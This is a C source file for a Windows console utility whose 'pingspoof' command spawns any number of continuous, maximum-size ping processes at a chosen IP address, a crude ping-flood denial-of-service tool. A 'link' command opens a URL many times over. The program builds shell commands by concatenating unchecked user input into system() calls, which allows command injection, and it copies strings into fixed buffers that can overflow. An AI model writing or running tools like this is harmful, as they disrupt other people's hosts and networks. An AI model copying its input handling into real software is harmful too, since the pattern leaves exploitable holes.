#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

void Check(char buffer[500])
{  
   if(!strcmp(buffer, "help"))
   {
      printf("\nhelp            - shows a list of commands\n");
      printf("exit & quit     - exits\n");
      printf("clear & cls     - clears console\n");
      printf("pingspoof       - ping someone a lot of times\n");
      printf("pingstop        - stops all active pingspoofers\n");
      printf("link        - opens link in your deafault browser\n\n");
   }
   else if (!strcmp(buffer, "exit") || !strcmp(buffer, "quit")) 
   {
      exit(0);
   }
   else if (!strcmp(buffer, "clear") || !strcmp(buffer, "cls")) 
   {
      system("cls");
   }
   else if (!strcmp(buffer, "pingspoof"))
   {
      char ip[500];

      printf("What is the ip you want to pingspoof? : ");
      scanf("%s", &ip); 

      int amount;

      printf("How many pingspoofers do you want? : ");
      scanf("%d", &amount); 

      char cmd[500] = "start /min ping ";
      strcat(cmd, ip);
      strcat(cmd, " -w 1 -l 65500 -t");

      for(int i = 0; i < amount; i++)
      {
         system(cmd);
      }

      printf("Type 'pingstop' to end pingspoofing\n\n");
   }
   else if(!strcmp(buffer, "pingstop"))
   {
      printf("Terminated pingspoofers : ");
      system("tasklist|find /i /c \"ping.exe\"");
      printf("\n");
      system("start /min taskkill /IM PING.exe /F");
   }
   else if(!strcmp(buffer, "link"))
   {
      char link[500];

      printf("What is the link you want to visit? : ");
      scanf("%s", &link); 

      int amount;

      printf("How many visits do you want? : ");
      scanf("%d", &amount); 

      char cmd[500] = "start ";
      strcat(cmd, link);

      for(int i = 0; i < amount; i++)
      {
         system(cmd);
      }
      
   }
   else
   {
      printf("Sorry, '%s' is not a valid command.\n", buffer);
   }
}

int main()
{
   char buffer[500];

   do 
   {
      printf("How can i help? : ");
      scanf("%s", &buffer);

      for(int i = 0; i < 500; i++)
      {
         buffer[i] = tolower(buffer[i]);
      }

      Check(buffer);
   } while (1);

   return 0;
}